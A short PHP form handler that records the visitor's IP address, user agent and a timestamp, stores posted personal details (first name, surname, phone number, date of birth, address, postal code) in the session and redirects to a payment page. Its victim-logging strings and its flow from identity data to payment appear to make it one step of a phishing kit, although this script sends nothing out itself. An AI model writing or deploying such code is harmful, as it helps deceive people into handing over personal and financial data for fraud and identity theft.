<?php

ob_start();
session_start();

$user_ip = 'Ip Adress : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$user_useragent = 'User Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$user_clickdate = date('d-m-Y H:i:s') . "\r\n";



 
$_SESSION['Prénom'] = $_POST['Prénom'];
$_SESSION['Nom'] = $_POST['Nom'];
$_SESSION['numéro'] = $_POST['numéro'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['Adresse'] = $_POST['Adresse'];
$_SESSION['Postal'] = $_POST['Postal'];




 
header('Location:./paiement.php'); ?>


